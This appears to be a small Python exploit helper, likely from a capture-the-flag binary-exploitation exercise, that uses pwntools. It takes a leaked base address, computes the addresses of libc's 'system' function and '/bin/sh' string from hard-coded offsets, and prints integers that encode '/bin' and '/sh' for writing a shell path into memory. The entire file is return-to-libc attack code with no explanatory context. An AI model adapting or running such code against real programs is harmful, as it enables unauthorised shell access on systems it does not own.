import sys
from pwn import u64


_abs = int(sys.argv[1], 0)
system_offset = 0xad60
binsh_offset = 0x1527d7
# print('binsh: ' + hex(_abs+binsh_offset))
first = 6845231
second = 1852400175
print('binsh #1: ' + str(first))
print('binsh #2: ' + str(second))
print('system: ' + hex(_abs+system_offset))
